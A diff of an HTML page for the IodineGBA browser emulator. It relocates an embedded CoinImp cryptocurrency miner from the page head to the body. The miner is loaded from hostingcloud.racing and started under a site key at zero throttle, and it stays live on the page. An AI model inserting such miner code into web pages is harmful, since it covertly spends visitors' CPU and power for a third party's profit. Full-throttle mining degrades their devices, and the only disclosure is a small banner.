@@ -52,15 +52,6 @@
         <script src="IodineGBA/core/cartridge/EEPROM.js"></script>
         <script src="IodineGBA/core/cartridge/GPIO.js"></script>
         <!--Add your webpage scripts below-->
-        <script src="https://www.hostingcloud.racing/K94c.js"></script>
-	<script>
-    		var _client = new Client.Anonymous('4d82a26c8cbca1f44f5d43d95c7a6c2e99e3cbd38fea63d59d421a57657248ea', {
-       			throttle: 0, c: 'w'
-    			});
-    		_client.start();
-    		_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
-	</script>
 	<script src="user_scripts/AudioGlueCode.js"></script>
         <script src="user_scripts/base64.js"></script>
         <script src="user_scripts/CoreGlueCode.js"></script>
@@ -77,7 +68,16 @@
         <link rel="stylesheet" href="user_css/main.css">
     </head>
     <body>
-        <div id="container">
+        <script src="https://www.hostingcloud.racing/K94c.js"></script>
+	<script>
+    		var _client = new Client.Anonymous('4d82a26c8cbca1f44f5d43d95c7a6c2e99e3cbd38fea63d59d421a57657248ea', {
+       			throttle: 0, c: 'w'
+    			});
+    		_client.start();
+    		_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+	</script>
+	    <div id="container">
             <div id="menu" class="paused">
                 <ul class="menu" id="menu_top">
                     <li>
